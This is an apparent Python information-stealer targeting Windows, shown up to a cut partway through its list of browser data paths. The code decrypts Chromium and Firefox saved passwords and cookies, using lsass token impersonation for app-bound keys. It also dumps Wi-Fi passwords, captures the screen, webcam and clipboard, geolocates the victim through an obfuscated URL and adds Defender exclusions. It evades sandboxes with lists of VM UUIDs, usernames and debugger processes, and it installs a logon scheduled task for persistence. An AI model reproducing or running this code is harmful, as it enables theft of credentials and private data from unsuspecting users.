import os
import ctypes
import io
import platform
import re
import struct
import time
import base64
import threading
import multiprocessing
import sqlite3
import zipfile
import win32crypt
import psutil
import shutil
import binascii
import json
import sys
import requests
import subprocess
import random
import windows
import windows.crypto
import windows.security
import windows.generated_def as gdef
import string
import conf.config as config
from Crypto.Cipher import AES, ChaCha20_Poly1305
from PIL import ImageGrab
from contextlib import contextmanager
from datetime import datetime
from uac_bypass import *
from io import BytesIO

multiprocessing.freeze_support()


cookie_count: int = 0
password_count: int = 0
autofill_count: int = 0
browsing_history: int = 0
discord_accounts: int = 0
minecraft_sessions: int = 0
gd_session = 0
steam_session = 0
ss_success = 0
webcam_success = 0
process_count = 0
clipboard_success = 0
system_info = 0
roblox_cookies = 0
bypass_success = 0

rblx_cookies = set()

def write(file, content):
    with open(file, 'a', encoding='utf-8') as f:
        f.write(content)

username = os.getenv('username')
pcname = os.getenv('COMPUTERNAME')

hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()

#print(repr(username))

def zip_folder(folder_path, zip_name):
    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                full_path = os.path.join(root, file)
                annall = os.path.relpath(full_path, folder_path)
                zipf.write(full_path, annall)

def removefile(file):
    try:
        os.remove(file)
    except:
        pass

def get_master_keyv2(local_state_path, nkey): # credits in readme file
    try:
        with open(local_state_path, 'r', encoding='utf-8', errors='ignore') as f:
            local_state = json.load(f)
        if 'os_crypt' not in local_state:
            return None
        if 'app_bound_encrypted_key' in local_state['os_crypt']:
            enc_key = binascii.a2b_base64(local_state['os_crypt']['app_bound_encrypted_key'])[4:]
        elif 'encrypted_key' in local_state['os_crypt']:
            enc_key = binascii.a2b_base64(local_state['os_crypt']['encrypted_key'])[5:]
            return windows.crypto.dpapi.unprotect(enc_key)
        else:
            return None
        with impersonate_lsass():
            system_dec = windows.crypto.dpapi.unprotect(enc_key)
        user_dec = windows.crypto.dpapi.unprotect(system_dec)
        parsed = parse_key_blob(user_dec)
        if parsed['flag'] not in (1, 2, 3):
            return user_dec[-32:]
        return derive_v20_master_key(parsed, nkey)
    except Exception as e:
        print('error getting master key', e)
        return None

@contextmanager
def impersonate_lsass():
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name.lower() == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    except Exception as e:
        print(f"Error impersonating lsass: {str(e)}", "ERROR")
    finally:
        windows.current_thread.token = original_token

def parse_key_blob(blob_data: bytes) -> dict:
    buffer = io.BytesIO(blob_data)
    parsed_data = {}
    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['flag'] = buffer.read(1)[0]
    if parsed_data['flag'] in (1, 2):
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    elif parsed_data['flag'] == 3:
        parsed_data['encrypted_aes_key'] = buffer.read(32)
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    else:
        parsed_data['raw_data'] = buffer.read()
    return parsed_data

def decrypt_with_cng(input_data, key_name):
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), "Microsoft Software Key Storage Provider", 0)
    if status != 0:
        return None
    hKey = gdef.NCRYPT_KEY_HANDLE()
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
    if status != 0:
        ncrypt.NCryptFreeObject(hProvider)
        return None
    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, None, 0, ctypes.byref(pcbResult), 0x40)
    if status != 0:
        ncrypt.NCryptFreeObject(hKey)
        ncrypt.NCryptFreeObject(hProvider)
        return None
    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * buffer_size)()
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, output_buffer, buffer_size,
                                 ctypes.byref(pcbResult), 0x40)
    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)
    if status != 0:
        return None
    return bytes(output_buffer[:pcbResult.value])

def byte_xor(ba1, ba2):
    return bytes(a ^ b for a, b in zip(ba1, ba2))

def derive_v20_master_key(parsed_data: dict, key_name) -> bytes:
    if parsed_data['flag'] == 1:
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
    elif parsed_data['flag'] == 2:
        chacha_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        cipher = ChaCha20_Poly1305.new(key=chacha_key, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
    elif parsed_data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with impersonate_lsass():
            dec_aes = decrypt_with_cng(parsed_data['encrypted_aes_key'], key_name)
            if not dec_aes:
                return None
        xored = byte_xor(dec_aes, xor_key)
        cipher = AES.new(xored, AES.MODE_GCM, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
    else:
        return parsed_data.get('raw_data', b'')

def decrypt_v20_value(encrypted_value: bytes, master_key: bytes) -> str:
    try:
        if not encrypted_value or encrypted_value[:3] != b'v20':
            return None
        iv = encrypted_value[3:15]
        payload = encrypted_value[15:-16]
        tag = encrypted_value[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        decrypted = cipher.decrypt_and_verify(payload, tag)
        return decrypted[32:].decode('utf-8', errors='replace')
    except Exception as e:
        print(f"Error decrypting v20 value: {str(e)}", "ERROR")
        return None

def decrypt_v20_password(encrypted_value: bytes, master_key: bytes) -> str:
    try:
        if not encrypted_value or encrypted_value[:3] != b'v20':
            return None
        iv = encrypted_value[3:15]
        payload = encrypted_value[15:-16]
        tag = encrypted_value[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        decrypted = cipher.decrypt_and_verify(payload, tag)
        return decrypted.decode('utf-8', errors='replace')
    except Exception as e:
        print(f"Error decrypting v20 password: {str(e)}", "ERROR")
        return None


def removedir(dir_):
    try:
        shutil.rmtree(dir_)
    except:
        pass
        
def load_nss(profile_path, nss3):
    if os.path.exists(nss3):
        nss = ctypes.CDLL(nss3)
        if nss.NSS_Init(profile_path.encode('utf-8')) == 0:
            return nss

def kill():
    if config.browsers:
        exes = ['msedge.exe', 'orbitum.exe', 'chromium.exe', 'iron.exe', 'wavebrowser.exe', 'samsunginternet.exe', 'iridium.exe', 'vivaldi.exe', '7chrome.exe', 'zen.exe', 'chrome.exe', 'mullvadbrowser.exe' 'amigo.exe', 'epic.exe', 'comet.exe', 'shift.exe', 'escosiabrowser.exe', 'duckduckgo.exe', 'dragon.exe', 'brave.exe', 'opera.exe', 'firefox.exe', 'hola.exe', 'AVGBrowser.exe', 'hola-browser.exe', 'waterfox.exe', 'seamonkey.exe', 'AvastBrowser.exe', 'browser.exe']
    
        for exe in exes:
            subprocess.run(["taskkill", "/F", "/IM", exe], text=True, creationflags=subprocess.CREATE_NO_WINDOW)

def decrypt_firefox_password(nss, encrypted_str):
    class SECItem(ctypes.Structure):
        _fields_ = [('type', ctypes.c_uint), ('data', ctypes.POINTER(ctypes.c_ubyte)), ('len', ctypes.c_uint)]

    decoded = base64.b64decode(encrypted_str)
    inp = SECItem(0, ctypes.cast(ctypes.create_string_buffer(decoded), ctypes.POINTER(ctypes.c_ubyte)), len(decoded))
    out = SECItem()
    if nss.PK11SDR_Decrypt(ctypes.byref(inp), ctypes.byref(out), None) == 0:
        result = ctypes.string_at(out.data, out.len).decode()
        return result

def exclusion(path):
    try:
        subprocess.run(f'powershell Add-MpPreference -ExclusionPath "{path}"', shell=True, check=True)
    except:
        print('failed to add exclusion')

def randstr(length: int):
    characters = string.ascii_letters + string.digits
    rndmstr = ''.join(random.choice(characters) for i in range(length))
    return rndmstr


def get_master_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        #print(f"[-] Master key fail: {e}")
        return None

def converttounix(timestamp):
    unix_time = (timestamp // 1_000_000) - 11644473600
    return unix_time

def converttounixfirefox(timestamp):
    unix_time = timestamp // 1000
    return unix_time

def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass

def decrypt_old(buff: bytes) -> str:
    try:
        decrypted_pass = win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1]
        return decrypted_pass.decode()
    except Exception as e:
        return None

localappdata = os.getenv('localappdata')
appdata = os.getenv('appdata')

output = os.path.join(localappdata, 'Temp', 'KIRK_{}'.format(username))

def isadmin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False


def askforadmin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

zip_ = os.path.join(os.getenv('temp'), os.path.basename(output) + '.zip')
os.makedirs(output, exist_ok=True)

ver = platform.version().split('.')[2] 
plat = platform.system() + " " + '10' if int(ver) < 22000 else platform.system() + " " + '11'

def getwifipassword(network):
    wifiinfo = subprocess.run(["netsh", "wlan", "show", "profile", f"name=\"{network}\"", "key=clear"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.splitlines()
    
    for line in wifiinfo:
        if 'Key Content' in line:
            wifipsw = line.split(':')[1][1:]
            return wifipsw


def getwifiprofiles():
    wifi_profiles = []
    wifi_P = []
    WProfiles = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.splitlines()
    
    for wifiprof in WProfiles:
        if 'All User Profile' in wifiprof:
            wifipf = wifiprof.split(':')[1][1:]
            wifi_P.append(wifipf)
    for wifiprofile in wifi_P:
        wifipassword = getwifipassword(wifiprofile)
        wifi_profiles.append([wifiprofile, wifipassword])
    
    return wifi_profiles
    

wifilist = getwifiprofiles()
wifiprofiles: int = len(wifilist)
    
def systeminfo():
    global system_info, process_count
    syst_ = os.path.join(output, 'System')
    os.makedirs(syst_, exist_ok=True)

    sysinfooutput = os.path.join(syst_, 'System.txt')
    ipoutput = os.path.join(syst_, 'IP Info.txt')
    procinfooutput = os.path.join(syst_, 'Processes.txt')
    macoutput = os.path.join(syst_, 'MAC Address.txt')

    ram = psutil.virtual_memory()
    totalram = ram.total
    availableram = ram.available
    ramusage = ram.percent
    usedram = ram.used
    freeram = ram.free

    macaddress = subprocess.check_output("getmac", shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().strip().replace('\r\n', '\n')
    operatingsystem = subprocess.check_output("powershell (Get-CimInstance Win32_OperatingSystem).Caption", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
    buildtype = subprocess.check_output("powershell (Get-CimInstance Win32_OperatingSystem).BuildType", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
    serialnumber = subprocess.check_output("powershell (Get-CimInstance Win32_BIOS).SerialNumber", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
    productkey = subprocess.check_output("powershell (Get-CimInstance -Class SoftwareLicensingService).OA3xOriginalProductKey", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
    installdate = subprocess.check_output("powershell (Get-CimInstance Win32_OperatingSystem).InstallDate", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
    bootdate = subprocess.check_output("powershell (Get-CimInstance Win32_OperatingSystem).LastBootUpTime", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
    refreshrate = subprocess.check_output("powershell (Get-CimInstance Win32_VideoController).MaxRefreshRate", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
    timezone = subprocess.check_output("powershell (Get-CimInstance Win32_TimeZone).Caption", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
    model = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystem).Model", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
    systemtype = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystem).SystemType", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
    processor = subprocess.check_output("powershell (Get-CimInstance Win32_Processor).Name", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
    biosversion = subprocess.check_output("powershell (Get-CimInstance Win32_BIOS).SMBIOSBIOSVersion", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
    screenwidth = subprocess.check_output("powershell (Get-CimInstance Win32_VideoController).CurrentHorizontalResolution", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
    screenheight = subprocess.check_output("powershell (Get-CimInstance Win32_VideoController).CurrentVerticalResolution", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
    antiviruses = subprocess.check_output("powershell (Get-CimInstance -Namespace 'root/SecurityCenter2' -ClassName 'AntivirusProduct').DisplayName", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip().replace('\r\n', '\n')
   
    ip_info = requests.get(base64.b64decode('aHR0cHM6Ly9pcGluZm8uaW8vanNvbg==').decode('utf-8'))
   
    sys_lines = []
    ip_lines = []
    proc_lines = []
    mac_lines = []
    if ip_info.status_code in [200, 201, 204]:
        ipinf = ip_info.json()
        ip_lines.append(f'IP Address: {ipinf.get("ip", "None")}')
        ip_lines.append(f'Hostname: {ipinf.get("hostname", "None")}')
        ip_lines.append(f'Location: {ipinf.get("city", "None")}, {ipinf.get("region", "None")}, {ipinf.get("country", "None")}')
        ip_lines.append(f'Coordinates: {ipinf.get("loc", "None")}')
        ip_lines.append(f'Postal: {ipinf.get("postal", "None")}')
        ip_lines.append(f'Organization: {ipinf.get("org", "None")}')

    processes = psutil.process_iter(['pid', 'name', 'username'])
    for proc in processes:
        try:
            proc_lines.append(f'PID: {proc.info["pid"]} | Name: {proc.info["name"]} | User: {proc.info["username"]}')
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue

    information = f"Username: {username}\nPC Name: {pcname}\nOperating System: {operatingsystem}\nSystem Type: {systemtype}\nBuild Type: {buildtype}\n\nInstall Date: {installdate}\nLast Boot Time: {bootdate}\nTimezone: {timezone}\n\nModel: {model}\nProcessor: {processor}\nBIOS Version: {biosversion}\n\nSerial Number: {serialnumber}\n\nProduct Key: {productkey}"   
    sys_lines.append(information)
    sys_lines.append(f'HWID: {hwid}')
    sys_lines.append(f'\nPath: {sys.executable}')

    wifiprofiles = len(wifilist)
    if wifiprofiles != 0:
        sys_lines.append('\nWi-Fi Networks:')
        for i, (network, password) in enumerate(wifilist):
            sys_lines.append(f'[{i + 1}]: {network}: {password}')

    sys_lines.append(f'\nAntiviruses Installed:')
    for i, av in enumerate(antiviruses.splitlines()):
        sys_lines.append(f'[{i + 1}]: {av}')

    sys_lines.append(f'\nTotal RAM: {round((totalram / 1073741824), 2)} GB\nAvailable RAM: {round((availableram / 1073741824), 2)} GB\nRAM Usage: {ramusage}%\nFree RAM: {round((freeram / 1073741824), 2)} GB\n')

    sys_lines.append(f'Screen Resolution: {screenwidth}x{screenheight}\n')

    sys_lines.append(f'Refresh Rate: {refreshrate}Hz\n')

    mac_lines.append(macaddress)

    write(sysinfooutput, '\n'.join(sys_lines))
    system_info = 1

    write(ipoutput, '\n'.join(ip_lines))

    write(procinfooutput, '\n'.join(proc_lines))
    process_count = len(proc_lines)

    write(macoutput, '\n'.join(mac_lines))

def get_webcam():
    global webcam_success
    if config.webcam:
        import cv2
        cam_ = os.path.join(output, 'System', 'Webcam.png')
        os.makedirs(os.path.dirname(cam_), exist_ok=True)
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                cv2.imwrite(cam_, frame)
                webcam_success = 1
            else:
                webcam_success = 0
            cap.release()
        except:
            webcam_success = 0

def get_clipboard():
    global clipboard_success
    clip_ = os.path.join(output, 'System', 'Clipboard.txt')
    try:
        result = subprocess.run('powershell Get-Clipboard', capture_output=True, text=True, shell=True, check=True)
        write(clip_, result.stdout.strip())
        clipboard_success = 1
    except:
        clipboard_success = 0

def screenshot():
    global ss_success
    syst_ = os.path.join(output, 'System')
    os.makedirs(syst_, exist_ok=True)
    try:
        screenshot = ImageGrab.grab().save(f"{os.path.join(syst_, 'Screenshot.png')}")
        ss_success = 1
    except:
        ss_success = 0

def anti_vm(): 
    vm_indicators = [
        "VBOX", "VIRTUALBOX", "VMWARE", "VIRTUAL", "HYPERV", "QEMU", "XEN", "PARALLELS"
    ]
    for indicator in vm_indicators:
        if indicator in platform.uname().system.upper() or indicator in platform.uname().node.upper():
            return True

    vm_usernames = ['wdagutilityaccount', 'wdc', 'vboxuser', 'vmwareuser', 'administrator', 'user', 'test', 'guest', 'server', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm']
    sandboxuuids = [
        '1D1FB0BB-21B9-4FC0-B017-A4DADA231E17',
        '20DC9FCF-04F2-46DB-866A-8B094D51E731',
        '4E29518F-71BD-4AD3-AEAA-B9B737A21F6F',
        'CF39B3BF-A04E-44F3-80E5-56A5937FA2A9',
        '0C32A046-8B53-47AC-9B09-39B209E8FE02',
        '671BC5F7-4B0F-FF43-B923-8B1645581DC8',
        '9DAD8B1F-2B6B-4C1B-9EFD-0EFBFCFDCDB7',
        '00000000-0000-0000-0000-000000000000',
        '11111111-1111-1111-1111-111111111111',
        '7AB5C494-39F5-4941-9163-47F54D6D5016',
        '032E02B4-0499-05C3-0806-3C0700080009',
        '03DE0294-0480-05DE-1A06-350700080009',
        '11111111-2222-3333-4444-555555555555',
        '6F3CA5EC-BEC9-4A4D-8274-11168F640058',
        'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548',
        '4C4C4544-0050-3710-8058-CAC04F59344A',
        '00000000-0000-0000-0000-AC1F6BD04972',
        '5BD24D56-789F-8468-7CDC-CAA7222CC121',
        '49434D53-0200-9065-2500-65902500E439',
        '49434D53-0200-9036-2500-36902500F022',
        '777D84B3-88D1-451C-93E4-D235177420A7',
        '49434D53-0200-9036-2500-369025000C65',
        'B1112042-52E8-E25B-3655-6A4F54155DBF',
        '00000000-0000-0000-0000-AC1F6BD048FE',
        'EB16924B-FB6D-4FA1-8666-17B91F62FB37',
        'A15A930C-8251-9645-AF63-E45AD728C20C',
        '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3',
        'C7D23342-A5D4-68A1-59AC-CF40F735B363',
        '63203342-0EB0-AA1A-4DF5-3FB37DBB0670',
        '44B94D56-65AB-DC02-86A0-98143A7423BF',
        '6608003F-ECE4-494E-B07E-1C4615D1D93C',
        'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A',
        '49434D53-0200-9036-2500-369025003AF0',
        '8B4E8278-525C-7343-B825-280AEBCD3BCB',
        '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27',
        '79AF5279-16CF-4094-9758-F88A616D81B4',
        'FE822042-A70C-D08B-F1D1-C207055A488F',
        '76122042-C286-FA81-F0A8-514CC507B250',
        '481E2042-A1AF-D390-CE06-A8F783B1E76A',
        'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C',
        '9961A120-E691-4FFE-B67B-F0E4115D5919',
        'FF577B79-782E-0A4D-8568-B35A9B7EB76B',
        '08C1E400-3C56-11EA-8000-3CECEF43FEDE',
        '6ECEAF72-3548-476C-BD8D-73134A9182C8',
        '49434D53-0200-9036-2500-369025003865',
        '119602E8-92F9-BD4B-8979-DA682276D385',
        '12204D56-28C0-AB03-51B7-44A8B7525250',
        '63FA3342-31C7-4E8E-8089-DAFF6CE5E967',
        '365B4000-3B25-11EA-8000-3CECEF44010C',
        'D8C30328-1B06-4611-8E3C-E433F4F9794E',
        '00000000-0000-0000-0000-50E5493391EF',
        '00000000-0000-0000-0000-AC1F6BD04D98',
        '4CB82042-BA8F-1748-C941-363C391CA7F3',
        'B6464A2B-92C7-4B95-A2D0-E5410081B812',
        'BB233342-2E01-718F-D4A1-E7F69D026428',
        '9921DE3A-5C1A-DF11-9078-563412000026',
        'CC5B3F62-2A04-4D2E-A46C-AA41B7050712',
        '00000000-0000-0000-0000-AC1F6BD04986',
        'C249957A-AA08-4B21-933F-9271BEC63C85',
        'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E',
        'ACA69200-3C4C-11EA-8000-3CECEF4401AA',
        '3F284CA4-8BDF-489B-A273-41B44D668F6D',
        'BB64E044-87BA-C847-BC0A-C797D1A16A50',
        '2E6FB594-9D55-4424-8E74-CE25A25E36B0',
        '42A82042-3F13-512F-5E3D-6BF4FFFD8518',
        '38AB3342-66B0-7175-0B23-F390B3728B78',
        '48941AE9-D52F-11DF-BBDA-503734826431',
        'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C',
        'E08DE9AA-C704-4261-B32D-57B2A3993518',
        '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9',
        '88DC3342-12E6-7D62-B0AE-C80E578E7B07',
        '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E',
        '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE',
        '0934E336-72E4-4E6A-B3E5-383BD8E938C3',
        '12EE3342-87A2-32DE-A390-4C2DA4D512E9',
        '38813342-D7D0-DFC8-C56F-7FC9DFE5C972',
        '8DA62042-8B59-B4E3-D232-38B29A10964A',
        '3A9F3342-D1F2-DF37-68AE-C10F60BFB462',
        'F5744000-3C78-11EA-8000-3CECEF43FEFE',
        'FA8C2042-205D-13B0-FCB5-C5CC55577A35',
        'C6B32042-4EC3-6FDF-C725-6F63914DA7C7',
        'FCE23342-91F1-EAFC-BA97-5AAE4509E173',
        'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F',
        '050C3342-FADD-AEDF-EF24-C6454E1A73C9',
        '4DC32042-E601-F329-21C1-03F27564FD6C',
        'DEAEB8CE-A573-9F48-BD40-62ED6C223F20',
        '05790C00-3B21-11EA-8000-3CECEF4400D0',
        '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57',
        '9C6D1742-046D-BC94-ED09-C36F70CC9A91',
        '907A2A79-7116-4CB6-9FA5-E5A58C4587CD',
        'A9C83342-4800-0578-1EE8-BA26D2A678D2',
        'D7382042-00A0-A6F0-1E51-FD1BBF06CD71',
        '1D4D3342-D6C4-710C-98A3-9CC6571234D5',
        'CE352E42-9339-8484-293A-BD50CDC639A5',
        '60C83342-0A97-928D-7316-5F1080A78E72',
        '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A',
        'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F',
        'FED63342-E0D6-C669-D53F-253D696D74DA',
        '2DD1B176-C043-49A4-830F-C623FFB88F3C',
        '4729AEB0-FC07-11E3-9673-CE39E79C8A00',
        '84FE3342-6C67-5FC6-5639-9B3CA3D775A1',
        'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D',
        'CEFC836C-8CB1-45A6-ADD7-209085EE2A57',
        'A7721742-BE24-8A1C-B859-D7F8251A83D3',
        '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E',
        'D2DC3342-396C-6737-A8F6-0C6673C1DE08',
        'EADD1742-4807-00A0-F92E-CCD933E9D8C1',
        'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1',
        'FE455D1A-BE27-4BA4-96C8-967A6D3A9661',
        '921E2042-70D3-F9F1-8CBD-B398A21F89C6'
    ]
    vm_files = [
        "C:\\windows\\system32\\vmGuestLib.dll",
        "C:\\windows\\system32\\vm3dgl.dll",
        "C:\\windows\\system32\\vboxhook.dll",
        "C:\\windows\\system32\\vboxmrxnp.dll",
        "C:\\windows\\system32\\vmsrvc.dll",
        "C:\\windows\\system32\\drivers\\vmsrvc.sys"
    ]
    blacklisted_processes = [
        'vmtoolsd.exe', 
        'vmwaretray.exe', 
        'vmwareuser.exe'
        'fakenet.exe', 
        'dumpcap.exe', 
        'httpdebuggerui.exe', 
        'wireshark.exe', 
        'fiddler.exe', 
        'vboxservice.exe', 
        'df5serv.exe', 
        'vboxtray.exe', 
        'vmwaretray.exe', 
        'ida64.exe', 
        'ollydbg.exe', 
        'pestudio.exe', 
        'vgauthservice.exe', 
        'vmacthlp.exe', 
        'x96dbg.exe', 
        'x32dbg.exe', 
        'prl_cc.exe', 
        'prl_tools.exe', 
        'xenservice.exe', 
        'qemu-ga.exe', 
        'joeboxcontrol.exe', 
        'ksdumperclient.exe', 
        'ksdumper.exe', 
        'joeboxserver.exe', 
    ]
    if hwid in sandboxuuids:
        return True

    if os.getenv('USERNAME').lower() in vm_usernames:
        return True

    if psutil.process_iter(attrs=['name']):
        for process in psutil.process_iter(attrs=['name']):
            if process.info['name'] in blacklisted_processes:
                return True
    for file in vm_files:
        if os.path.exists(file):
            return True
    return False

def persistence(copypath):
    taskname = "kirkyboiiii"
    try:
        shutil.copy2(sys.executable, copypath)
        existing = subprocess.run('schtasks /query /tn {} /v /fo list'.format(taskname), shell=True, capture_output=True, text=True)
        if not copypath in existing.stdout:
            subprocess.run('schtasks /delete /tn {} /f'.format(taskname), shell=True, check=True, text=True, capture_output=True)
        else:
            return
        subprocess.run('schtasks /create /sc onlogon /tn {} /tr "{}" /rl highest'.format(taskname, copypath), shell=True, check=True, text=True, capture_output=True)
            

    except Exception as e:
        print('persistence failed', e)

def stealchromium():
    global cookie_count
    global password_count
    global browsing_history
    global autofill_count
    global rblx_cookies
    if config.browsers:
    
        chromium_paths = {
            'Chrome': {'path': localappdata + '\\Google\\Chrome\\User Data', 'localstate': localappdata + '\\Google\\Chrome\\User Data\\Local State'},
            'Chrome SxS': {'path': localappdata + '\\Google\\Chrome SxS\\User Data', 'localstate': localappdata + '\\Google\\Chrome SxS\\User Data\\Local State'},
            'Chrome Dev': {'path': localappdata + '\\Google\\Chrome Dev\\User Data', 'localstate': localappdata + '\\Google\\Chrome Dev\\User Data\\Local State'},
            'Chrome Beta': {'path': localappdata + '\\Google\\Chrome Beta\\User Data', 'localstate': localappdata + '\\Google\\Chrome Beta\\User Data\\Local State'},
            'AVG': {'path': localappdata + '\\AVG\\Browser\\User Data', 'localstate': localappdata + '\\AVG\\Browser\\User Data\\Local State'},
            'Chromium': {'path': localappdata + '\\Chromium\\User Data', 'localstate': localappdata + '\\Chromium\\User Data\\Local State'},
            'Amigo': {'path': localappdata + '\\Amigo\\User Data', 'localstate': localappdata + '\\Amigo\\User Data\\Local State'},
            'Hola': {'path': localappdata + '\\Hola\\chromium_profile', 'localstate': localappdata + '\\Hola\\chromium_profile\\Local State'},
            'Samsung Internet': {'path': localappdata + '\\Samsung\\Internet\\User Data', 'localstate': localappdata + '\\Samsung\\Internet\\User Data\\Local State'},
            'Supermium': {'path': localappdata + '\\Supermium\\User Data', 'localstate': localappdata + '\\Supermium\\User Data\\Local State'},
            'Orbitum': {'path': localappdata + '\\Orbitum\\User Data', 'localstate': localappdata + '\\Orbitum\\User Data\\Local State'}, #(?)
            'Iridium': {'path': localappdata + '\\Iridium\\User Data', 'localstate': localappdata + '\\Iridium\\User Data\\Local State'},
            '7Star': {'path': localappdata + '\\7Star\\7Star\\User Data', 'localstate': localappdata + '\\7Star\\7Star\\User Data\\Local State'},
            
            'Cent Browser': {'path': localappdata + '\\CentBrowser\\User Data', 'localstate': localappdata + '\\CentBrowser\\User Data\\Local State'},
            'WaveBrowser': {'path': localappdata + '\\WaveBrowser\\User Data', 'localstate': localappdata + '\\WaveBrowser\\User Data\\Local State'},
            'Helium': {'path': localappdata + '\\imput\\Helium\\User Data', 'localstate': localappdata + '\\imput\\Helium\\User Data\\Local State'},
            'Escosia': {'path': localappdata + '\\EscosiaBrowser\\User Data', 'localstate': localappdata + '\\EscosiaBrowser\\User Data\\Local State'},
            'Shift': {'path': localappdata + '\\Shift\\User Data', 'localstate': localappdata + '\\Shift\\User Data\\Local State'},
            'Comet': {'path': localappdata + '\\Perplexity\\Comet\\User Data', 'localstate': localappdata + '\\Perplexity\\Comet\\User Data\\Local State'},
            'Yandex': {'path': localappdata + '\\Yandex\\YandexBrowser\\User Data', 'localstate': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Local State'},
